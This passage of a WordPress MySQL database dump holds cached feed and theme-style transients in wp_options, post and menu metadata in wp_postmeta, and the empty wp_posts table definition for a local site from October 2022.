weeks.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"12940\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}}}s:27:\"http://www.w3.org/2005/Atom\";a:1:{s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:0:\"\";s:7:\"attribs\";a:1:{s:0:\"\";a:3:{s:4:\"href\";s:32:\"https://wordpress.org/news/feed/\";s:3:\"rel\";s:4:\"self\";s:4:\"type\";s:19:\"application/rss+xml\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:44:\"http://purl.org/rss/1.0/modules/syndication/\";a:2:{s:12:\"updatePeriod\";a:1:{i:0;a:5:{s:4:\"data\";s:9:\"\n	hourly	\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:15:\"updateFrequency\";a:1:{i:0;a:5:{s:4:\"data\";s:4:\"\n	1	\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:4:\"site\";a:1:{i:0;a:5:{s:4:\"data\";s:8:\"14607090\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}}}}}}}}s:4:\"type\";i:128;s:7:\"headers\";O:42:\"Requests_Utility_CaseInsensitiveDictionary\":1:{s:7:\"\0*\0data\";a:9:{s:6:\"server\";s:5:\"nginx\";s:4:\"date\";s:29:\"Sat, 29 Oct 2022 13:27:26 GMT\";s:12:\"content-type\";s:34:\"application/rss+xml; charset=UTF-8\";s:25:\"strict-transport-security\";s:11:\"max-age=360\";s:6:\"x-olaf\";s:3:\"⛄\";s:13:\"last-modified\";s:29:\"Wed, 26 Oct 2022 15:43:59 GMT\";s:4:\"link\";s:63:\"<https://wordpress.org/news/wp-json/>; rel=\"https://api.w.org/\"\";s:15:\"x-frame-options\";s:10:\"SAMEORIGIN\";s:4:\"x-nc\";s:9:\"HIT ord 2\";}}s:5:\"build\";s:14:\"20211220193300\";}', 'no');
INSERT INTO `wp_options` (`option_id`, `option_name`, `option_value`, `autoload`) VALUES
(2164, '_transient_timeout_feed_mod_9bbd59226dc36b9b26cd43f15694c5c3', '1667093248', 'no'),
(2165, '_transient_feed_mod_9bbd59226dc36b9b26cd43f15694c5c3', '1667050048', 'no'),
(2166, '_transient_timeout_feed_d117b5738fbd35bd8c0391cda1f2b5d9', '1667093249', 'no');
INSERT INTO `wp_options` (`option_id`, `option_name`, `option_value`, `autoload`) VALUES
INSERT INTO `wp_options` (`option_id`, `option_name`, `option_value`, `autoload`) VALUES
(2168, '_transient_timeout_feed_mod_d117b5738fbd35bd8c0391cda1f2b5d9', '1667093249', 'no'),
(2169, '_transient_feed_mod_d117b5738fbd35bd8c0391cda1f2b5d9', '1667050049', 'no'),
(2170, '_transient_timeout_dash_v2_88ae138922fe95674369b1cb3d215a2b', '1667093249', 'no'),
(2171, '_transient_dash_v2_88ae138922fe95674369b1cb3d215a2b', '<div class=\"rss-widget\"><ul><li><a class=\'rsswidget\' href=\'https://wordpress.org/news/2022/10/wordpress-6-1-release-candidate-3/\'>WordPress 6.1 Release Candidate 3 (RC3) Now Available</a></li><li><a class=\'rsswidget\' href=\'https://wordpress.org/news/2022/10/wordpress-6-1-release-candidate-2-now-available/\'>WordPress 6.1 Release Candidate 2 (RC2) Now Available</a></li></ul></div><div class=\"rss-widget\"><ul><li><a class=\'rsswidget\' href=\'https://buddypress.org/2022/10/bp-rewrites-1-4-0-maintenance-release/\'>BuddyPress: BP Rewrites 1.4.0 Maintenance Release</a></li><li><a class=\'rsswidget\' href=\'https://wptavern.com/the-wordpress-community-isnt-ready-to-leave-twitter\'>WPTavern: The WordPress Community Isn’t Ready to Leave Twitter</a></li><li><a class=\'rsswidget\' href=\'https://poststatus.com/agency-owners-if-you-could-ask-anyone-anything/\'>Post Status: Agency Owners: If You Could Ask Anyone Anything…</a></li></ul></div>', 'no'),
(2173, '_transient_timeout_global_styles_exs-dark', '1667050214', 'no'),
(2174, '_transient_global_styles_exs-dark', 'body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--light: var(--colorLight);--wp--preset--color--font: var(--colorFont);--wp--preset--color--font-muted: var(--colorFontMuted);--wp--preset--color--background: var(--colorBackground);--wp--preset--color--border: var(--colorBorder);--wp--preset--color--dark: var(--colorDark);--wp--preset--color--dark-muted: var(--colorDarkMuted);--wp--preset--color--main: var(--colorMain);--wp--preset--color--main-2: var(--colorMain2);--wp--preset--color--main-3: var(--colorMain3);--wp--preset--color--main-4: var(--colorMain4);--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url(\'#wp-duotone-dark-grayscale\');--wp--preset--duotone--grayscale: url(\'#wp-duotone-grayscale\');--wp--preset--duotone--purple-yellow: url(\'#wp-duotone-purple-yellow\');--wp--preset--duotone--blue-red: url(\'#wp-duotone-blue-red\');--wp--preset--duotone--midnight: url(\'#wp-duotone-midnight\');--wp--preset--duotone--magenta-yellow: url(\'#wp-duotone-magenta-yellow\');--wp--preset--duotone--purple-green: url(\'#wp-duotone-purple-green\');--wp--preset--duotone--blue-orange: url(\'#wp-duotone-blue-orange\');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 1.35em;--wp--preset--font-size--large: 1.45em;--wp--preset--font-size--x-large: 42px;--wp--preset--font-size--normal: 18px;--wp--preset--font-size--huge: 1.65em;--wp--preset--font-size--xl: calc(1em + 1.5vmin);--wp--preset--font-size--xxl: calc(2em + 2vmin);--wp--preset--font-size--xxxl: calc(2.25em + 5vmin);--wp--preset--font-size--xxxxl: calc(2.25em + 7vmin);}body { margin: 0; }.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: auto; }.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-light-color{color: var(--wp--preset--color--light) !important;}.has-font-color{color: var(--wp--preset--color--font) !important;}.has-font-muted-color{color: var(--wp--preset--color--font-muted) !important;}.has-background-color{color: var(--wp--preset--color--background) !important;}.has-border-color{color: var(--wp--preset--color--border) !important;}.has-dark-color{color: var(--wp--preset--color--dark) !important;}.has-dark-muted-color{color: var(--wp--preset--color--dark-muted) !important;}.has-main-color{color: var(--wp--preset--color--main) !important;}.has-main-2-color{color: var(--wp--preset--color--main-2) !important;}.has-main-3-color{color: var(--wp--preset--color--main-3) !important;}.has-main-4-color{color: var(--wp--preset--color--main-4) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-light-background-color{background-color: var(--wp--preset--color--light) !important;}.has-font-background-color{background-color: var(--wp--preset--color--font) !important;}.has-font-muted-background-color{background-color: var(--wp--preset--color--font-muted) !important;}.has-background-background-color{background-color: var(--wp--preset--color--background) !important;}.has-border-background-color{background-color: var(--wp--preset--color--border) !important;}.has-dark-background-color{background-color: var(--wp--preset--color--dark) !important;}.has-dark-muted-background-color{background-color: var(--wp--preset--color--dark-muted) !important;}.has-main-background-color{background-color: var(--wp--preset--color--main) !important;}.has-main-2-background-color{background-color: var(--wp--preset--color--main-2) !important;}.has-main-3-background-color{background-color: var(--wp--preset--color--main-3) !important;}.has-main-4-background-color{background-color: var(--wp--preset--color--main-4) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-light-border-color{border-color: var(--wp--preset--color--light) !important;}.has-font-border-color{border-color: var(--wp--preset--color--font) !important;}.has-font-muted-border-color{border-color: var(--wp--preset--color--font-muted) !important;}.has-background-border-color{border-color: var(--wp--preset--color--background) !important;}.has-border-border-color{border-color: var(--wp--preset--color--border) !important;}.has-dark-border-color{border-color: var(--wp--preset--color--dark) !important;}.has-dark-muted-border-color{border-color: var(--wp--preset--color--dark-muted) !important;}.has-main-border-color{border-color: var(--wp--preset--color--main) !important;}.has-main-2-border-color{border-color: var(--wp--preset--color--main-2) !important;}.has-main-3-border-color{border-color: var(--wp--preset--color--main-3) !important;}.has-main-4-border-color{border-color: var(--wp--preset--color--main-4) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-normal-font-size{font-size: var(--wp--preset--font-size--normal) !important;}.has-huge-font-size{font-size: var(--wp--preset--font-size--huge) !important;}.has-xl-font-size{font-size: var(--wp--preset--font-size--xl) !important;}.has-xxl-font-size{font-size: var(--wp--preset--font-size--xxl) !important;}.has-xxxl-font-size{font-size: var(--wp--preset--font-size--xxxl) !important;}.has-xxxxl-font-size{font-size: var(--wp--preset--font-size--xxxxl) !important;}', 'no'),
(2175, '_transient_timeout_global_styles_svg_filters_exs-dark', '1667050214', 'no'),
(2176, '_transient_global_styles_svg_filters_exs-dark', '<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 0 0\" width=\"0\" height=\"0\" focusable=\"false\" role=\"none\" style=\"visibility: hidden; position: absolute; left: -9999px; overflow: hidden;\" ><defs><filter id=\"wp-duotone-dark-grayscale\"><feColorMatrix color-interpolation-filters=\"sRGB\" type=\"matrix\" values=\" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 \" /><feComponentTransfer color-interpolation-filters=\"sRGB\" ><feFuncR type=\"table\" tableValues=\"0 0.49803921568627\" /><feFuncG type=\"table\" tableValues=\"0 0.49803921568627\" /><feFuncB type=\"table\" tableValues=\"0 0.49803921568627\" /><feFuncA type=\"table\" tableValues=\"1 1\" /></feComponentTransfer><feComposite in2=\"SourceGraphic\" operator=\"in\" /></filter></defs></svg><svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 0 0\" width=\"0\" height=\"0\" focusable=\"false\" role=\"none\" style=\"visibility: hidden; position: absolute; left: -9999px; overflow: hidden;\" ><defs><filter id=\"wp-duotone-grayscale\"><feColorMatrix color-interpolation-filters=\"sRGB\" type=\"matrix\" values=\" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 \" /><feComponentTransfer color-interpolation-filters=\"sRGB\" ><feFuncR type=\"table\" tableValues=\"0 1\" /><feFuncG type=\"table\" tableValues=\"0 1\" /><feFuncB type=\"table\" tableValues=\"0 1\" /><feFuncA type=\"table\" tableValues=\"1 1\" /></feComponentTransfer><feComposite in2=\"SourceGraphic\" operator=\"in\" /></filter></defs></svg><svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 0 0\" width=\"0\" height=\"0\" focusable=\"false\" role=\"none\" style=\"visibility: hidden; position: absolute; left: -9999px; overflow: hidden;\" ><defs><filter id=\"wp-duotone-purple-yellow\"><feColorMatrix color-interpolation-filters=\"sRGB\" type=\"matrix\" values=\" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 \" /><feComponentTransfer color-interpolation-filters=\"sRGB\" ><feFuncR type=\"table\" tableValues=\"0.54901960784314 0.98823529411765\" /><feFuncG type=\"table\" tableValues=\"0 1\" /><feFuncB type=\"table\" tableValues=\"0.71764705882353 0.25490196078431\" /><feFuncA type=\"table\" tableValues=\"1 1\" /></feComponentTransfer><feComposite in2=\"SourceGraphic\" operator=\"in\" /></filter></defs></svg><svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 0 0\" width=\"0\" height=\"0\" focusable=\"false\" role=\"none\" style=\"visibility: hidden; position: absolute; left: -9999px; overflow: hidden;\" ><defs><filter id=\"wp-duotone-blue-red\"><feColorMatrix color-interpolation-filters=\"sRGB\" type=\"matrix\" values=\" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 \" /><feComponentTransfer color-interpolation-filters=\"sRGB\" ><feFuncR type=\"table\" tableValues=\"0 1\" /><feFuncG type=\"table\" tableValues=\"0 0.27843137254902\" /><feFuncB type=\"table\" tableValues=\"0.5921568627451 0.27843137254902\" /><feFuncA type=\"table\" tableValues=\"1 1\" /></feComponentTransfer><feComposite in2=\"SourceGraphic\" operator=\"in\" /></filter></defs></svg><svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 0 0\" width=\"0\" height=\"0\" focusable=\"false\" role=\"none\" style=\"visibility: hidden; position: absolute; left: -9999px; overflow: hidden;\" ><defs><filter id=\"wp-duotone-midnight\"><feColorMatrix color-interpolation-filters=\"sRGB\" type=\"matrix\" values=\" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 \" /><feComponentTransfer color-interpolation-filters=\"sRGB\" ><feFuncR type=\"table\" tableValues=\"0 0\" /><feFuncG type=\"table\" tableValues=\"0 0.64705882352941\" /><feFuncB type=\"table\" tableValues=\"0 1\" /><feFuncA type=\"table\" tableValues=\"1 1\" /></feComponentTransfer><feComposite in2=\"SourceGraphic\" operator=\"in\" /></filter></defs></svg><svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 0 0\" width=\"0\" height=\"0\" focusable=\"false\" role=\"none\" style=\"visibility: hidden; position: absolute; left: -9999px; overflow: hidden;\" ><defs><filter id=\"wp-duotone-magenta-yellow\"><feColorMatrix color-interpolation-filters=\"sRGB\" type=\"matrix\" values=\" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 \" /><feComponentTransfer color-interpolation-filters=\"sRGB\" ><feFuncR type=\"table\" tableValues=\"0.78039215686275 1\" /><feFuncG type=\"table\" tableValues=\"0 0.94901960784314\" /><feFuncB type=\"table\" tableValues=\"0.35294117647059 0.47058823529412\" /><feFuncA type=\"table\" tableValues=\"1 1\" /></feComponentTransfer><feComposite in2=\"SourceGraphic\" operator=\"in\" /></filter></defs></svg><svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 0 0\" width=\"0\" height=\"0\" focusable=\"false\" role=\"none\" style=\"visibility: hidden; position: absolute; left: -9999px; overflow: hidden;\" ><defs><filter id=\"wp-duotone-purple-green\"><feColorMatrix color-interpolation-filters=\"sRGB\" type=\"matrix\" values=\" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 \" /><feComponentTransfer color-interpolation-filters=\"sRGB\" ><feFuncR type=\"table\" tableValues=\"0.65098039215686 0.40392156862745\" /><feFuncG type=\"table\" tableValues=\"0 1\" /><feFuncB type=\"table\" tableValues=\"0.44705882352941 0.4\" /><feFuncA type=\"table\" tableValues=\"1 1\" /></feComponentTransfer><feComposite in2=\"SourceGraphic\" operator=\"in\" /></filter></defs></svg><svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 0 0\" width=\"0\" height=\"0\" focusable=\"false\" role=\"none\" style=\"visibility: hidden; position: absolute; left: -9999px; overflow: hidden;\" ><defs><filter id=\"wp-duotone-blue-orange\"><feColorMatrix color-interpolation-filters=\"sRGB\" type=\"matrix\" values=\" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 \" /><feComponentTransfer color-interpolation-filters=\"sRGB\" ><feFuncR type=\"table\" tableValues=\"0.098039215686275 1\" /><feFuncG type=\"table\" tableValues=\"0 0.66274509803922\" /><feFuncB type=\"table\" tableValues=\"0.84705882352941 0.41960784313725\" /><feFuncA type=\"table\" tableValues=\"1 1\" /></feComponentTransfer><feComposite in2=\"SourceGraphic\" operator=\"in\" /></filter></defs></svg>', 'no'),
(2180, '_site_transient_timeout_browser_a7cb8b4dd0a5e7d8ea0dee31394ec3b3', '1667655011', 'no'),
(2181, '_site_transient_browser_a7cb8b4dd0a5e7d8ea0dee31394ec3b3', 'a:10:{s:4:\"name\";s:6:\"Chrome\";s:7:\"version\";s:13:\"106.0.5249.62\";s:8:\"platform\";s:7:\"Windows\";s:10:\"update_url\";s:29:\"https://www.google.com/chrome\";s:7:\"img_src\";s:43:\"http://s.w.org/images/browsers/chrome.png?1\";s:11:\"img_src_ssl\";s:44:\"https://s.w.org/images/browsers/chrome.png?1\";s:15:\"current_version\";s:2:\"18\";s:7:\"upgrade\";b:0;s:8:\"insecure\";b:0;s:6:\"mobile\";b:0;}', 'no');

-- --------------------------------------------------------

--
-- Table structure for table `wp_postmeta`
--

CREATE TABLE `wp_postmeta` (
  `meta_id` bigint(20) UNSIGNED NOT NULL,
  `post_id` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_postmeta`
--

INSERT INTO `wp_postmeta` (`meta_id`, `post_id`, `meta_key`, `meta_value`) VALUES
(1, 2, '_wp_page_template', 'default'),
(2, 3, '_wp_page_template', 'default'),
(3, 5, '_edit_lock', '1666512593:1'),
(4, 5, '_wp_trash_meta_status', 'publish'),
(5, 5, '_wp_trash_meta_time', '1666512620'),
(6, 1, '_wp_trash_meta_status', 'publish'),
(7, 1, '_wp_trash_meta_time', '1666512655'),
(8, 1, '_wp_desired_post_slug', 'hello-world'),
(9, 1, '_wp_trash_meta_comments_status', 'a:1:{i:1;s:1:\"1\";}'),
(10, 7, '_edit_lock', '1666514551:1'),
(12, 10, '_edit_lock', '1666514572:1'),
(14, 12, '_edit_lock', '1666514588:1'),
(16, 14, '_edit_lock', '1666513420:1'),
(18, 16, '_wp_trash_meta_status', 'publish'),
(19, 16, '_wp_trash_meta_time', '1666513335'),
(20, 2, '_wp_trash_meta_status', 'publish'),
(21, 2, '_wp_trash_meta_time', '1666513351'),
(22, 2, '_wp_desired_post_slug', 'sample-page'),
(23, 3, '_wp_trash_meta_status', 'draft'),
(24, 3, '_wp_trash_meta_time', '1666513356'),
(25, 3, '_wp_desired_post_slug', 'privacy-policy'),
(26, 14, '_edit_last', '1'),
(27, 14, '_wp_page_template', 'default'),
(29, 12, '_edit_last', '1'),
(30, 12, '_wp_page_template', 'default'),
(32, 10, '_edit_last', '1'),
(33, 10, '_wp_page_template', 'default'),
(35, 7, '_edit_last', '1'),
(36, 7, '_wp_page_template', 'default'),
(38, 12, '_cmplz_scanned_post', '1'),
(39, 10, '_cmplz_scanned_post', '1'),
(40, 7, '_cmplz_scanned_post', '1'),
(41, 14, '_cmplz_scanned_post', '1'),
(42, 19, '_edit_lock', '1666514113:1'),
(44, 7, '_wp_old_date', '2022-10-23'),
(46, 10, '_wp_old_date', '2022-10-23'),
(48, 12, '_wp_old_date', '2022-10-23'),
(51, 22, '_edit_lock', '1666534008:1'),
(52, 22, '_edit_last', '1'),
(53, 22, 'cmplz_hide_cookiebanner', ''),
(54, 22, '_yoast_wpseo_estimated-reading-time-minutes', '1'),
(55, 22, '_yoast_wpseo_wordproof_timestamp', ''),
(58, 27, '_menu_item_type', 'post_type'),
(59, 27, '_menu_item_menu_item_parent', '0'),
(60, 27, '_menu_item_object_id', '22'),
(61, 27, '_menu_item_object', 'page'),
(62, 27, '_menu_item_target', ''),
(63, 27, '_menu_item_classes', 'a:1:{i:0;s:0:\"\";}'),
(64, 27, '_menu_item_xfn', ''),
(65, 27, '_menu_item_url', ''),
(66, 28, '_menu_item_type', 'custom'),
(67, 28, '_menu_item_menu_item_parent', '0'),
(68, 28, '_menu_item_object_id', '28'),
(69, 28, '_menu_item_object', 'custom'),
(70, 28, '_menu_item_target', ''),
(71, 28, '_menu_item_classes', 'a:1:{i:0;s:0:\"\";}'),
(72, 28, '_menu_item_xfn', ''),
(73, 28, '_menu_item_url', 'http://localhost'),
(74, 26, '_wp_trash_meta_status', 'publish'),
(75, 26, '_wp_trash_meta_time', '1666534129'),
(76, 29, '_edit_lock', '1666534172:1'),
(77, 30, '_menu_item_type', 'post_type'),
(78, 30, '_menu_item_menu_item_parent', '0'),
(79, 30, '_menu_item_object_id', '19'),
(80, 30, '_menu_item_object', 'page'),
(81, 30, '_menu_item_target', ''),
(82, 30, '_menu_item_classes', 'a:1:{i:0;s:0:\"\";}'),
(83, 30, '_menu_item_xfn', ''),
(84, 30, '_menu_item_url', ''),
(85, 29, '_wp_trash_meta_status', 'publish'),
(86, 29, '_wp_trash_meta_time', '1666534173'),
(94, 22, 'gwolle_gb_read', 'true'),
(101, 57, '_wp_trash_meta_status', 'publish'),
(102, 57, '_wp_trash_meta_time', '1666541580'),
(103, 57, '_wp_desired_post_slug', 'events');

-- --------------------------------------------------------

--
-- Table structure for table `wp_posts`
--

CREATE TABLE `wp_posts` (
  `ID` bigint(20) UNSIGNED NOT NULL,
  `post_author` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `post_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_date_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_content` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_title` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_excerpt` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'publish',
  `comment_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'open',
  `ping_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'open',
  `post_password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `post_name` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `to_ping` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `pinged` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_modified_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_content_filtered` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_parent` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `guid` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `menu_order` int(11) NOT NULL DEFAULT 0,
  `post_type` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'post',
  `post_mime_type` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_count` bigint(20) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_posts`
--

